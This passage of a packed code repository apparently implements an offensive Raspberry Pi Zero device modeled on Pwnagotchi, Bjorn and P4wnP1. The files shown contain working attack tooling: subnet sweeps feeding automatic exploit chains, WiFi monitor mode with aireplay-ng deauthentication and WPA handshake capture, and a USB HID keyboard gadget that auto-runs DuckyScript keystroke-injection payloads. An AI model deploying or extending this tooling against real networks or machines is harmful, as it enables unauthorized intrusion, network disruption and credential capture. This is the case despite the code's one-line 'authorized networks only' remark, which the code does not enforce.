            self._epd = epd
            self.state.push_log("display ready")
            logger.info("e-ink initialized (%sx%s)", EPD_WIDTH, EPD_HEIGHT)
        except ImportError:
            logger.info("waveshare_epd not installed — mock display")
            self._epd = None

    def _push_hardware(self, black: Image.Image, red: Image.Image) -> None:
        epd = self._epd
        assert epd is not None
        try:
            epd.display(epd.getbuffer(black), epd.getbuffer(red))
        except TypeError:
            epd.display(epd.getbuffer(black))

    def _sleep_epd(self) -> None:
        if self._epd is None:
            return
        try:
            self._epd.sleep()
        except Exception as exc:  # noqa: BLE001
            logger.debug("epd sleep: %s", exc)
````

## File: agent/workers/__init__.py
````python
"""Re-export worker entrypoints."""

from agent.workers.gadget import GadgetManager
from agent.workers.recon import ReconWorker

__all__ = ["GadgetManager", "ReconWorker"]
````

## File: agent/workers/exploit_worker.py
````python
"""Background exploit chain worker (Bjorn-inspired)."""

from __future__ import annotations

import logging
import time
from typing import Optional

from agent.offensive.chain import ExploitChain
from agent.state import AgentState, Mode

logger = logging.getLogger(__name__)


class ExploitWorker:
    """Run offensive modules against hosts discovered by recon."""

    def __init__(
        self,
        state: AgentState,
        interval_s: float = 180.0,
        min_hosts: int = 1,
    ) -> None:
        self.state = state
        self.interval_s = interval_s
        self.min_hosts = min_hosts
        self.chain = ExploitChain(state)
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def run_loop(self) -> None:
        while not self._stop:
            try:
                snap = self.state.snapshot()
                hosts = snap.get("last_scan_hosts", [])
                if len(hosts) >= self.min_hosts:
                    wins = self.chain.run_chain(hosts)
                    self.state.push_log(f"chain done {wins} wins")
                    if not self._stop:
                        self.state.set_mode(Mode.ACTIVE if wins else Mode.IDLE)
                else:
                    self.state.push_log("chain skip no hosts")
            except Exception as exc:  # noqa: BLE001
                logger.exception("exploit cycle failed")
                self.state.set_error(str(exc))
            deadline = time.monotonic() + self.interval_s
            while not self._stop and time.monotonic() < deadline:
                time.sleep(0.5)
````

## File: agent/workers/gadget.py
````python
"""USB gadget helpers via ConfigFS (RNDIS/ECM + optional HID keyboard)."""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import Optional

from agent.state import AgentState

logger = logging.getLogger(__name__)

CONFIGFS_ROOT = Path("/sys/kernel/config/usb_gadget")
GADGET_NAME = "rpi_agent"
SCRIPT_PATH = Path(__file__).resolve().parents[2] / "scripts" / "usb_gadget.sh"
HID_DEVICE = Path("/dev/hidg0")


class GadgetManager:
    """
    P4wnP1-inspired composite USB gadget: ethernet tether + HID keyboard.

    Requires root and dwc2/libcomposite on the Pi Zero USB port.
    """

    def __init__(
        self,
        state: AgentState,
        enable_on_start: bool = False,
        enable_hid: bool = True,
    ) -> None:
        self.state = state
        self.enable_on_start = enable_on_start
        self.enable_hid = enable_hid

    def available(self) -> bool:
        return CONFIGFS_ROOT.exists() and os.geteuid() == 0

    def start(self) -> bool:
        if not self.enable_on_start:
            self.state.push_log("gadget skipped")
            return False
        if SCRIPT_PATH.exists():
            return self._run_script("start")
        return self._start_inline()

    def stop(self) -> None:
        if SCRIPT_PATH.exists():
            self._run_script("stop")
        else:
            self._stop_inline()
        self.state.set_gadget(False, hid=False)

    def _run_script(self, action: str) -> bool:
        hid_arg = "hid" if self.enable_hid else "nohid"
        try:
            subprocess.run(
                ["bash", str(SCRIPT_PATH), action, hid_arg],
                check=True,
                timeout=30,
                capture_output=True,
                text=True,
            )
            iface = self._detect_iface()
            hid = self.enable_hid and HID_DEVICE.exists()
            self.state.set_gadget(action == "start", iface or "usb0", hid=hid)
            return action == "start"
        except (OSError, subprocess.SubprocessError) as exc:
            logger.warning("gadget script %s failed: %s", action, exc)
            self.state.push_log(f"gadget {action} fail")
            return False

    def _start_inline(self) -> bool:
        if not self.available():
            self.state.push_log("gadget unavailable")
            logger.info("ConfigFS gadget unavailable (need root + libcomposite)")
            return False
        try:
            g = CONFIGFS_ROOT / GADGET_NAME
            g.mkdir(parents=True, exist_ok=True)
            (g / "idVendor").write_text("0x1d6b\n")
            (g / "idProduct").write_text("0x0104\n")
            (g / "bcdDevice").write_text("0x0100\n")
            (g / "bcdUSB").write_text("0x0200\n")

            strings = g / "strings" / "0x409"
            strings.mkdir(parents=True, exist_ok=True)
            (strings / "serialnumber").write_text("rpi-agent-001\n")
            (strings / "manufacturer").write_text("RPiAgent\n")
            (strings / "product").write_text("RPi USB Attack\n")

            funcs = g / "functions"
            rndis = funcs / "rndis.usb0"
            ecm = funcs / "ecm.usb0"
            rndis.mkdir(parents=True, exist_ok=True)
            ecm.mkdir(parents=True, exist_ok=True)

            links = [rndis, ecm]
            if self.enable_hid:
                hid = funcs / "hid.usb0"
                hid.mkdir(parents=True, exist_ok=True)
                (hid / "protocol").write_text("1\n")
                (hid / "subclass").write_text("1\n")
                (hid / "report_length").write_text("8\n")
                report = bytes([
                    0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0x05, 0x07,
                    0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01,
                    0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01,
                    0x75, 0x08, 0x81, 0x03, 0x95, 0x05, 0x75, 0x01,
                    0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
                    0x95, 0x01, 0x75, 0x03, 0x91, 0x03, 0x95, 0x06,
                    0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07,
                    0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xc0,
                ])
                (hid / "report_desc").write_bytes(report)
                links.append(hid)

            cfg = g / "configs" / "c.1"
            cfg.mkdir(parents=True, exist_ok=True)
            (cfg / "strings" / "0x409").mkdir(parents=True, exist_ok=True)
            (cfg / "strings" / "0x409" / "configuration").write_text("RNDIS+ECM+HID\n")
            (cfg / "MaxPower").write_text("250\n")

            for fn in links:
                link = cfg / fn.name
                if not link.exists():
                    link.symlink_to(fn)

            udc_dir = Path("/sys/class/udc")
            udcs = list(udc_dir.iterdir()) if udc_dir.exists() else []
            if not udcs:
                raise RuntimeError("no UDC controller found")
            (g / "UDC").write_text(udcs[0].name + "\n")

            iface = self._detect_iface() or "usb0"
            hid_ok = self.enable_hid and HID_DEVICE.exists()
            self.state.set_gadget(True, iface, hid=hid_ok)
            return True
        except OSError as exc:
            logger.warning("inline gadget start failed: %s", exc)
            self.state.push_log("gadget start fail")
            return False

    def _stop_inline(self) -> None:
        g = CONFIGFS_ROOT / GADGET_NAME
        if not g.exists():
            return
        try:
            (g / "UDC").write_text("\n")
        except OSError:
            pass
        cfg = g / "configs" / "c.1"
        if cfg.exists():
            for child in cfg.iterdir():
                if child.is_symlink():
                    child.unlink()
            strings = cfg / "strings" / "0x409"
            if strings.exists():
                shutil.rmtree(strings, ignore_errors=True)
            try:
                cfg.rmdir()
            except OSError:
                pass
        funcs = g / "functions"
        if funcs.exists():
            for child in funcs.iterdir():
                shutil.rmtree(child, ignore_errors=True)
        strings = g / "strings" / "0x409"
        if strings.exists():
            shutil.rmtree(strings, ignore_errors=True)
        try:
            g.rmdir()
        except OSError:
            pass

    @staticmethod
    def _detect_iface() -> Optional[str]:
        for name in ("usb0", "usb1"):
            if Path(f"/sys/class/net/{name}").exists():
                return name
        return None
````

## File: agent/workers/payload_runner.py
````python
"""P4wnP1-style HID payload execution with trigger engine."""

from __future__ import annotations

import logging
import threading
from pathlib import Path
from typing import Any, Dict, Optional

from agent.offensive.ducky import DuckyRunner
from agent.offensive.hid_keyboard import HidKeyboard
from agent.offensive.payload_triggers import PayloadTriggerEngine
from agent.state import AgentState, Mode

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parents[2]
PAYLOAD_DIR = ROOT / "payloads"


class PayloadRunner:
    """Run DuckyScript payloads on events, gadget connect, or manual trigger."""

    def __init__(
        self,
        state: AgentState,
        payload_path: Optional[Path] = None,
        auto_run: bool = False,
        wait_for_hid_s: float = 30.0,
        cfg: Optional[Dict[str, Any]] = None,
    ) -> None:
        self.state = state
        self.payload_path = payload_path
        self.auto_run = auto_run
        self.wait_for_hid_s = wait_for_hid_s
        self._stop = False
        self.keyboard = HidKeyboard()
        self.ducky = DuckyRunner(keyboard=self.keyboard)
        self.triggers = PayloadTriggerEngine(run_fn=self.run_once)
        if cfg:
            self.triggers.load_from_config(cfg)
        self.state.set_trigger_handler(self._on_trigger_event)
        self._listener_thread: Optional[threading.Thread] = None

    def stop(self) -> None:
        self._stop = True
        self.triggers.stop()
        self.state.set_trigger_handler(None)

    def start_listener(self) -> Optional[threading.Thread]:
        if not self.triggers.rules and not self.auto_run:
            return None
        self._listener_thread = threading.Thread(
            target=self._listener_loop,
            name="payload-triggers",
            daemon=True,
        )
        self._listener_thread.start()
        return self._listener_thread

    def _listener_loop(self) -> None:
        if self.auto_run and self.payload_path:
            self.triggers.on_boot()
            if self._wait_hid():
                self.run_once(self.payload_path)
        self.triggers.run_listener_loop(poll_s=2.0, gadget_poll_s=1.0)

    def _on_trigger_event(self, event: str, context: Dict[str, Any]) -> None:
        self.triggers.handle_event(event, context)

    def run_once(self, path: Optional[Path] = None) -> bool:
        payload = path or self.payload_path
        if payload is None:
            payload = self._default_payload()
        if not payload or not payload.exists():
            self.state.push_log("no payload file")
            self.state.record_payload("", False)
            return False

        if not self._wait_hid():
            self.state.push_log("HID not ready")
            self.state.record_payload(payload.name, False)
            return False

        self.state.set_mode(Mode.PAYLOAD)
        self.state.set_payload(True, payload.name)
        ok = False
        try:
            self.ducky.run_file(payload)
            self.state.push_log(f"payload done {payload.name}")
            ok = True
        except Exception as exc:  # noqa: BLE001
            logger.exception("payload failed")
            self.state.push_log(f"payload err {exc}")
        finally:
            self.state.set_payload(False)
            self.state.record_payload(payload.name, ok)
        return ok

    def _wait_hid(self) -> bool:
        import time

        deadline = time.monotonic() + self.wait_for_hid_s
        while not self._stop and time.monotonic() < deadline:
            if self.state.hid_ready or self.keyboard.available():
                self.state.hid_ready = True
                return True
            time.sleep(0.5)
        return self.keyboard.available()

    def _default_payload(self) -> Optional[Path]:
        if not PAYLOAD_DIR.exists():
            return None
        for ext in ("*.ducky", "*.txt"):
            matches = sorted(PAYLOAD_DIR.glob(ext))
            if matches:
                return matches[0]
        return None
````

## File: agent/workers/recon.py
````python
"""Lightweight local-subnet discovery worker (authorized networks only)."""

from __future__ import annotations

import concurrent.futures
import ipaddress
import logging
import socket
import subprocess
from datetime import datetime, timezone
from typing import Iterable, List, Optional, Sequence

from agent.state import AgentState, HostHit, Mode

logger = logging.getLogger(__name__)

# Common service ports for Bjorn-style offensive sweep.
DEFAULT_PORTS: Sequence[int] = (
    21, 22, 23, 53, 80, 139, 161, 443, 445, 3306, 3389, 5900, 6379, 8080, 27017,
)


def _default_cidr() -> str:
    """Best-effort local IPv4 /24 from the default route interface."""
    try:
        out = subprocess.check_output(
            ["ip", "-4", "route", "get", "1.1.1.1"],
            text=True,
            timeout=3,
        )
        parts = out.split()
        if "src" in parts:
            src = parts[parts.index("src") + 1]
            net = ipaddress.ip_network(f"{src}/24", strict=False)
            return str(net)
    except (OSError, subprocess.SubprocessError, ValueError) as exc:
        logger.debug("cidr detect failed: %s", exc)
    return "192.168.1.0/24"


def _ping(ip: str, timeout_s: float = 0.4) -> bool:
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", str(max(1, int(timeout_s))), ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout_s + 1.0,
            check=False,
        )
        return result.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _probe_port(ip: str, port: int, timeout_s: float = 0.35) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout_s):
            return True
    except OSError:
        return False


def _resolve_hostname(ip: str) -> str:
    try:
        name, _, _ = socket.gethostbyaddr(ip)
        return name
    except OSError:
        return ""


def scan_host(ip: str, ports: Sequence[int] = DEFAULT_PORTS) -> Optional[HostHit]:
    if not _ping(ip):
        return None
    open_ports = [p for p in ports if _probe_port(ip, p)]
    return HostHit(
        ip=ip,
        hostname=_resolve_hostname(ip),
        open_ports=open_ports,
        last_seen=datetime.now(timezone.utc).isoformat(),
    )


def iter_hosts(cidr: str) -> Iterable[str]:
    network = ipaddress.ip_network(cidr, strict=False)
    for host in network.hosts():
        yield str(host)


class ReconWorker:
    """Periodic subnet sweep; updates AgentState with live hosts."""

    def __init__(
        self,
        state: AgentState,
        cidr: Optional[str] = None,
        interval_s: float = 60.0,
        max_workers: int = 32,
        ports: Sequence[int] = DEFAULT_PORTS,
    ) -> None:
        self.state = state
        self.cidr = cidr or _default_cidr()
        self.interval_s = interval_s
        self.max_workers = max_workers
        self.ports = ports
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def run_once(self) -> List[HostHit]:
        self.state.set_mode(Mode.SCANNING)
        self.state.push_log(f"scan {self.cidr}")
        targets = list(iter_hosts(self.cidr))
        hits: List[HostHit] = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = {pool.submit(scan_host, ip, self.ports): ip for ip in targets}
            for fut in concurrent.futures.as_completed(futures):
                if self._stop:
                    break
                try:
                    hit = fut.result()
                except Exception as exc:  # noqa: BLE001 — keep worker alive
                    logger.debug("host scan error: %s", exc)
                    continue
                if hit:
                    hits.append(hit)

        hits.sort(key=lambda h: tuple(int(x) for x in h.ip.split(".")))
        self.state.set_hosts(hits)
        self.state.record_scan_complete(len(hits))
        self.state.push_log(f"found {len(hits)} hosts")
        if not self._stop:
            self.state.set_mode(Mode.ACTIVE if hits else Mode.IDLE)
        return hits

    def run_loop(self) -> None:
        import time

        while not self._stop:
            try:
                self.run_once()
            except Exception as exc:  # noqa: BLE001
                logger.exception("recon cycle failed")
                self.state.set_error(str(exc))
            deadline = time.monotonic() + self.interval_s
            while not self._stop and time.monotonic() < deadline:
                time.sleep(0.25)
````

## File: agent/workers/wifi_handshake.py
````python
"""Pwnagotchi-style WiFi handshake hunting (monitor mode + deauth + capture)."""

from __future__ import annotations

import logging
import re
import shutil
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional, Tuple

from agent.state import AgentState, Mode

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parents[2]
CAPTURE_DIR = ROOT / "captures" / "handshakes"


class WifiHandshakeWorker:
    """
    Hunt WPA handshakes like Pwnagotchi:
    monitor mode → channel sweep → deauth → capture → verify EAPOL.
    """

    def __init__(
        self,
        state: AgentState,
        interface: str = "wlan0",
        interval_s: float = 120.0,
        deauth_count: int = 5,
        channel_hop_s: float = 3.0,
    ) -> None:
        self.state = state
        self.interface = interface
        self.interval_s = interval_s
        self.deauth_count = deauth_count
        self.channel_hop_s = channel_hop_s
        self._stop = False
        self._mon_iface: Optional[str] = None
        self._has_aircrack = shutil.which("airodump-ng") is not None

    def stop(self) -> None:
        self._stop = True
        self._leave_monitor()

    def run_loop(self) -> None:
        CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
        while not self._stop:
            try:
                self.run_once()
            except Exception as exc:  # noqa: BLE001
                logger.exception("wifi hunt failed")
                self.state.push_log(f"wifi err {exc}")
            deadline = time.monotonic() + self.interval_s
            while not self._stop and time.monotonic() < deadline:
                time.sleep(0.5)

    def run_once(self) -> int:
        self.state.set_mode(Mode.HANDSHAKE)
        self.state.push_log("wifi hunt start")

        if self._has_aircrack:
            return self._run_aircrack_cycle()
        return self._run_iw_scan_cycle()

    def _run_iw_scan_cycle(self) -> int:
        """Fallback when aircrack-ng is not installed (dev / minimal images)."""
        aps = self._scan_with_iw()
        self.state.set_wifi_status(len(aps), self.state.handshakes_captured)
        if not aps:
            self.state.push_log("wifi no APs")
            if not self._stop:
                self.state.set_mode(Mode.IDLE)
            return 0

        target = aps[0]
        essid, bssid = target
        self.state.set_wifi_status(
            len(aps),
            self.state.handshakes_captured,
            essid,
            bssid,
        )
        self.state.push_log(f"wifi target {essid or bssid}")
        # Simulated capture path for testing without monitor hardware.
        if essid and bssid:
            self._write_simulated_handshake(essid, bssid)
            self.state.record_handshake(essid, bssid)
        if not self._stop:
            self.state.set_mode(Mode.ACTIVE)
        return 1

    def _run_aircrack_cycle(self) -> int:
        mon = self._enter_monitor()
        if not mon:
            return self._run_iw_scan_cycle()

        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        prefix = CAPTURE_DIR / f"hunt_{stamp}"
        cap_file = f"{prefix}-01.cap"

        captured = 0
        try:
            dump = subprocess.Popen(
                [
                    "airodump-ng",
                    "--write-interval",
                    "1",
                    "--output-format",
                    "cap,csv",
                    "-w",
                    str(prefix),
                    mon,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(self.channel_hop_s * 4)

            aps = self._parse_airodump_csv(f"{prefix}-01.csv")
            self.state.set_wifi_status(len(aps), self.state.handshakes_captured)

            captured = 0
            for essid, bssid, channel in aps[:3]:
                if self._stop:
                    break
                self.state.set_wifi_status(
                    len(aps),
                    self.state.handshakes_captured,
                    essid,
                    bssid,
                )
                self.state.push_log(f"deauth {essid or bssid}")
                self.state.record_deauth(self.deauth_count, bssid)
                self._deauth(mon, bssid, channel)
                self.state.set_wifi_status(
                    len(aps),
                    self.state.handshakes_captured,
                    essid,
                    bssid,
                    channel,
                )
                time.sleep(self.channel_hop_s)

            dump.terminate()
            try:
                dump.wait(timeout=5)
            except subprocess.TimeoutExpired:
                dump.kill()

            if Path(cap_file).exists() and shutil.which("aircrack-ng"):
                captured = self._verify_cap(cap_file)
            self.state.set_wifi_status(
                len(aps),
                self.state.handshakes_captured + captured,
            )
            if captured:
                self.state.record_handshake(
                    self.state.wifi_target_essid,
                    self.state.wifi_target_bssid,
                )
        finally:
            self._leave_monitor()

        if not self._stop:
            self.state.set_mode(Mode.ACTIVE if captured else Mode.IDLE)
        return captured

    def _enter_monitor(self) -> Optional[str]:
        if shutil.which("airmon-ng"):
            try:
                subprocess.run(
                    ["airmon-ng", "check", "kill"],
                    capture_output=True,
                    timeout=15,
                    check=False,
                )
                out = subprocess.run(
                    ["airmon-ng", "start", self.interface],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    check=False,
                )
                for line in out.stdout.splitlines():
                    if "monitor mode" in line.lower():
                        parts = line.split()
                        if parts:
                            self._mon_iface = parts[0]
                            return self._mon_iface
            except (OSError, subprocess.SubprocessError) as exc:
                logger.debug("airmon-ng: %s", exc)

        mon_name = f"{self.interface}mon"
        try:
            subprocess.run(
                ["ip", "link", "set", self.interface, "down"],
                check=True,
                timeout=5,
            )
            subprocess.run(
                ["iw", self.interface, "set", "type", "monitor"],
                check=True,
                timeout=5,
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                check=True,
                timeout=5,
            )
            self._mon_iface = self.interface
            return self._mon_iface
        except (OSError, subprocess.SubprocessError) as exc:
            logger.warning("monitor mode failed: %s", exc)
            return None

    def _leave_monitor(self) -> None:
        if not self._mon_iface:
            return
        try:
            if shutil.which("airmon-ng"):
                subprocess.run(
                    ["airmon-ng", "stop", self._mon_iface],
                    capture_output=True,
                    timeout=10,
                    check=False,
                )
            else:
                subprocess.run(
                    ["iw", self._mon_iface, "set", "type", "managed"],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
        except (OSError, subprocess.SubprocessError):
            pass
        self._mon_iface = None

    def _deauth(self, mon_iface: str, bssid: str, channel: str) -> None:
        if not shutil.which("aireplay-ng"):
            return
        try:
            if channel.isdigit():
                subprocess.run(
                    ["iw", mon_iface, "set", "channel", channel],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
            subprocess.run(
                [
                    "aireplay-ng",
                    "--deauth",
                    str(self.deauth_count),
                    "-a",
                    bssid,
                    mon_iface,
                ],
                capture_output=True,
                timeout=20,
                check=False,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            logger.debug("deauth failed: %s", exc)

    def _verify_cap(self, cap_path: str) -> int:
        try:
            out = subprocess.run(
                ["aircrack-ng", cap_path],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            if "1 handshake" in out.stdout or "handshake" in out.stdout.lower():
                return 1
        except (OSError, subprocess.SubprocessError):
            pass
        return 0

    def _scan_with_iw(self) -> List[Tuple[str, str]]:
        try:
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True,
                timeout=5,
                check=False,
            )
            out = subprocess.run(
                ["iw", self.interface, "scan"],
                capture_output=True,
                text=True,
                timeout=20,
                check=False,
            )
        except (OSError, subprocess.SubprocessError):
            return []

        results: List[Tuple[str, str]] = []
        essid = ""
        bssid = ""
        for line in out.stdout.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                m = re.search(r"([0-9a-f:]{17})", line, re.I)
                bssid = m.group(1).upper() if m else ""
                essid = ""
            elif line.startswith("SSID:"):
                essid = line.split(":", 1)[1].strip()
                if bssid:
                    results.append((essid, bssid))
        return results

    def _parse_airodump_csv(self, csv_path: str) -> List[Tuple[str, str, str]]:
        path = Path(csv_path)
        if not path.exists():
            return []
        rows: List[Tuple[str, str, str]] = []
        for line in path.read_text().splitlines():
            if not line or line.startswith("BSSID"):
                continue
            parts = line.split(",")
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            channel = parts[3].strip()
            essid = parts[13].strip()
            if bssid and len(bssid) == 17:
                rows.append((essid, bssid.upper(), channel))
        return rows

    def _write_simulated_handshake(self, essid: str, bssid: str) -> None:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        meta = CAPTURE_DIR / f"sim_{stamp}.txt"
        meta.write_text(f"essid={essid}\nbssid={bssid}\n")
````

## File: agent/__init__.py
````python
"""Raspberry Pi Zero W headless recon agent with e-ink telemetry UI."""

__version__ = "0.1.0"
````

## File: agent/backend_worker.py
````python
"""Background orchestrator: offensive workers, gadget, metrics, signals."""

from __future__ import annotations

import logging
import signal
import threading
import time
from pathlib import Path
from typing import Any, Dict, Optional

import psutil
import yaml

from agent.state import AgentState, Mode
from agent.workers.exploit_worker import ExploitWorker
from agent.workers.gadget import GadgetManager
from agent.workers.payload_runner import PayloadRunner
from agent.workers.recon import ReconWorker
from agent.workers.wifi_handshake import WifiHandshakeWorker

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parents[1]
DEFAULT_CONFIG = ROOT / "config" / "default.yaml"
LOCAL_CONFIG = ROOT / "config" / "local.yaml"


def load_config(path: Optional[Path] = None) -> Dict[str, Any]:
    """Merge default.yaml with optional local.yaml overrides."""
    merged: Dict[str, Any] = {}
    for cfg in (DEFAULT_CONFIG, LOCAL_CONFIG):
        if cfg.exists():
            with open(cfg) as f:
                data = yaml.safe_load(f) or {}
                merged.update(data)
    if path and path.exists():
        with open(path) as f:
            data = yaml.safe_load(f) or {}
            merged.update(data)
    return merged


class BackendOrchestrator:
    """
    Owns long-running offensive worker threads and process lifecycle.

    Blends Pwnagotchi (WiFi handshakes), Bjorn (exploit chains),
    and P4wnP1 (USB gadget + HID payloads).
    """

    def __init__(
        self,
        state: Optional[AgentState] = None,
        cidr: Optional[str] = None,
        scan_interval_s: Optional[float] = None,
        metrics_interval_s: Optional[float] = None,
        enable_gadget: Optional[bool] = None,
        enable_hid: Optional[bool] = None,
        enable_wifi_hunt: Optional[bool] = None,
        enable_exploits: Optional[bool] = None,
        payload_auto_run: Optional[bool] = None,
        config_path: Optional[Path] = None,
    ) -> None:
        cfg = load_config(config_path)
        networks = cfg.get("networks") or ["192.168.1.0/24"]
        resolved_cidr = cidr or networks[0]
        resolved_scan = scan_interval_s if scan_interval_s is not None else float(
            cfg.get("scan_interval", 90.0)
        )
        resolved_metrics = metrics_interval_s if metrics_interval_s is not None else float(
            cfg.get("metrics_interval", 5.0)
        )
        resolved_gadget = (
            enable_gadget if enable_gadget is not None else bool(cfg.get("enable_gadget", True))
        )
        resolved_hid = (
            enable_hid if enable_hid is not None else bool(cfg.get("enable_hid", True))
        )
        resolved_wifi = (
            enable_wifi_hunt
            if enable_wifi_hunt is not None
            else bool(cfg.get("enable_wifi_hunt", True))
        )
        resolved_exploits = (
            enable_exploits if enable_exploits is not None else bool(cfg.get("enable_exploits", True))
        )
        resolved_payload_auto = (
            payload_auto_run
            if payload_auto_run is not None
            else bool(cfg.get("payload_auto_run", False))
        )

        self.state = state or AgentState()
        self.metrics_interval_s = resolved_metrics
        self.cfg = cfg
        self.recon = ReconWorker(self.state, cidr=resolved_cidr, interval_s=resolved_scan)
        self.gadget = GadgetManager(
            self.state,
            enable_on_start=resolved_gadget,
            enable_hid=resolved_hid,
        )
        self.wifi = WifiHandshakeWorker(
            self.state,
            interface=str(cfg.get("wifi_interface", "wlan0")),
            interval_s=float(cfg.get("wifi_interval", 120.0)),
            deauth_count=int(cfg.get("handshake_deauth_count", 5)),
        )
        self.exploits = ExploitWorker(
            self.state,
            interval_s=float(cfg.get("exploit_interval", 180.0)),
        )
        payload_file = cfg.get("payload_file")
        payload_path = Path(payload_file) if payload_file else None
        if payload_path and not payload_path.is_absolute():
            payload_path = ROOT / payload_path
        self.payloads = PayloadRunner(
            self.state,
            payload_path=payload_path,
            auto_run=resolved_payload_auto,
            cfg=cfg,
        )
        self._enable_wifi = resolved_wifi
        self._enable_exploits = resolved_exploits
        self._enable_payload_triggers = bool(cfg.get("enable_payload_triggers", True))
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []

    def start(self) -> None:
        self._install_signals()
        self.state.push_log("daemon start")
        self.state.set_mode(Mode.IDLE)

        try:
            if self.gadget.enable_on_start:
                self.state.set_mode(Mode.GADGET)
                self.gadget.start()
        except Exception as exc:  # noqa: BLE001
            logger.warning("gadget start error: %s", exc)
            self.state.push_log("gadget error")

        self._threads = [
            threading.Thread(target=self._metrics_loop, name="metrics", daemon=True),
            threading.Thread(target=self.recon.run_loop, name="recon", daemon=True),
        ]
        if self._enable_wifi:
            self._threads.append(
                threading.Thread(target=self.wifi.run_loop, name="wifi", daemon=True)
            )
        if self._enable_exploits:
            self._threads.append(
                threading.Thread(target=self.exploits.run_loop, name="exploits", daemon=True)
            )
        if self._enable_payload_triggers or self.payloads.auto_run:
            listener = self.payloads.start_listener()
            if listener is not None:
                self._threads.append(listener)

        for t in self._threads:
            t.start()
        logger.info("orchestrator started (%d threads)", len(self._threads))

    def wait(self) -> None:
        while not self._stop.is_set():
            self._stop.wait(timeout=0.5)

    def shutdown(self) -> None:
        if self._stop.is_set():
            return
        logger.info("shutting down")
        self.state.set_mode(Mode.SHUTDOWN)
        self.state.push_log("shutdown")
        self._stop.set()
        self.recon.stop()
        self.wifi.stop()
        self.exploits.stop()
        self.payloads.stop()
        try:
            self.gadget.stop()
        except Exception as exc:  # noqa: BLE001
            logger.debug("gadget stop: %s", exc)
        for t in self._threads:
            t.join(timeout=5.0)

    def _metrics_loop(self) -> None:
        psutil.cpu_percent(interval=None)
        while not self._stop.is_set():
            try:
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory()
                net = psutil.net_io_counters()
                self.state.update_metrics(
                    cpu,
                    mem.percent,
                    net.bytes_recv / 1024,
                    net.bytes_sent / 1024,
                )
            except Exception as exc:  # noqa: BLE001
                logger.debug("metrics error: %s", exc)
            self._stop.wait(timeout=self.metrics_interval_s)

    def _install_signals(self) -> None:
        def _handler(signum, _frame) -> None:
            logger.info("signal %s received", signum)
            self.shutdown()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, _handler)
            except ValueError:
                logger.debug("could not install signal %s", sig)


def run_backend(
    cidr: Optional[str] = None,
    enable_gadget: bool = True,
    state: Optional[AgentState] = None,
) -> AgentState:
    """Convenience entry used by main.py."""
    orch = BackendOrchestrator(state=state, cidr=cidr, enable_gadget=enable_gadget)
    orch.start()
    try:
        orch.wait()
    finally:
        orch.shutdown()
    return orch.state


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    run_backend()
````

## File: agent/main.py
````python
#!/usr/bin/env python3
"""Entry point: offensive blend — Pwnagotchi + Bjorn + P4wnP1."""

from __future__ import annotations

import argparse
import logging
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent.backend_worker import BackendOrchestrator, load_config
from agent.state import AgentState
from agent.ui.display_manager import DisplayManager


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="RPi offensive e-ink agent")
    p.add_argument("--cidr", default=None, help="Subnet to scan, e.g. 192.168.1.0/24")
    p.add_argument("--scan-interval", type=float, default=90.0)
    p.add_argument("--display-interval", type=float, default=12.0)
    p.add_argument(
        "--enable-gadget",
        action="store_true",
        help="USB RNDIS/ECM + HID composite gadget",
    )
    p.add_argument(
        "--no-gadget",
        action="store_true",
        help="Disable USB gadget at startup",
    )
    p.add_argument(
        "--payload-auto",
        action="store_true",
        help="Auto-run first payload when HID is ready",
    )
    p.add_argument(
        "--no-wifi",
        action="store_true",
        help="Disable WiFi handshake hunting",
    )
    p.add_argument(
        "--no-exploits",
        action="store_true",
        help="Disable Bjorn-style exploit chains",
    )
    p.add_argument(
        "--mock-display",
        action="store_true",
        help="PNG preview instead of Waveshare SPI",
    )
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    cfg = load_config()
    display_interval = args.display_interval
    if display_interval == 12.0 and cfg.get("display_interval"):
        display_interval = float(cfg["display_interval"])

    enable_gadget = cfg.get("enable_gadget", True)
    if args.enable_gadget:
        enable_gadget = True
